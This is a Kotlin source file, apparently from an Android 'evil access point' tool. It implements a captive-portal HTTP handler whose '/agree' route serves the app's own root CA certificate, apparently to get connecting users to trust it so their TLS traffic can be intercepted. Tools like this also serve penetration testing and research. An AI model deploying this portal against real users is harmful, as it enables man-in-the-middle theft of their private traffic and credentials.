package com.nibiru.evilap.proxy

import android.util.Log
import com.nibiru.evilap.EvilApApp
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.Socket
import java.net.SocketTimeoutException

internal class ThreadCaptivePortal(private val sClient: Socket) : Runnable {
    private val TAG = javaClass.simpleName
    private var keepAlive = true
    private val DEBUG = false

    override fun run() {
        //things we will eventually close
        var inData: BufferedReader ?= null
        var outStream: OutputStream ? = null
        try {
            inData = BufferedReader(InputStreamReader(sClient.getInputStream()))
            outStream = sClient.getOutputStream()

            val reqFile = getRequestedFile(inData)
            if (reqFile == null) {
                Log.e(TAG, "Cannot read request, closing")
                return
            }
            when(reqFile) {
                "/" -> {
                    sendResponse(outStream, "text/html; charset=utf-8", 200,
                            EvilApApp.instance.indexFile)
                }
                "/agree" -> {
                    sendResponse(outStream, "application/x-x509-ca-cert", 200,
                            EvilApApp.instance.ca.toPemString(EvilApApp.instance.ca.root).toByteArray())
                }
                else -> {
                    sendResponse(outStream, "text/html; charset=utf-8", 404,
                            EvilApApp.instance.notFoundFile)
                }
            }
            outStream.flush()
            Log.d(TAG, "[RESPONSE SEND]")
        } catch (e: IOException) {
            if (e is SocketTimeoutException)
                Log.e(TAG, "TIMEOUT!")
            else
                e.printStackTrace()
        } finally {
            try { //clean up
                Log.e(TAG, "Cleaning client resources")
                if (outStream != null) outStream.close()
                if (inData != null) inData.close()
                sClient.close()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }

    private fun sendResponse(out: OutputStream, mime: String, code: Int, body: ByteArray){
        when (code) {
            200 -> { out.write("HTTP/1.1 200 OK\r\n".toByteArray()) }
            404 -> { out.write("HTTP/1.1 404 Not Found\r\n".toByteArray()) }
        }
        out.write("Connection: close\r\n".toByteArray())
        out.write("Content-Type: $mime\r\n".toByteArray())
//        if("cert" in mime){
//            out.write("Content-Disposition: inline; filename=ca-cert.pem\r\n".toByteArray())
//        }
        out.write("Content-Length: ${body.size}\r\n\r\n".toByteArray())
        out.write(body)
    }

    private fun getRequestedFile(inR: BufferedReader): String?{
        val requestLine = inR.readLine() ?: return null
        Log.d(TAG,"[REQUEST LINE] $requestLine")
        val requestLineValues = requestLine.split("\\s+".toRegex())

        var line: String
        loop@ while(true){
            line = inR.readLine()
            if(DEBUG) Log.d("$TAG[LINE]", line)
            val header = line.split(": ")
            when(header[0]) {
                "" -> break@loop
                //"Connection" -> keepAlive = header[1] != "close"
                else -> { }
            }
        }
        return requestLineValues[1]
    }
}